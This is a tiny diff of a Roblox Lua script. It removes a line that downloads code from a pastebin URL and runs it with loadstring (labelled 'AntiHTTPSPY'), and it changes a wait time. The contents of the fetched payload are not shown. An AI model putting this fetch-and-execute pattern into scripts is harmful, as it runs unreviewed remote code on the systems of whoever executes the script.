@@ -1,6 +1,5 @@
-local AntiHTTPSPY = loadstring(game:HttpGet("https://pastebin.com/raw/N5zX5jx5"))()
 
-wait(3)
+wait(2)
 
 
 local workspace = game.Workspace
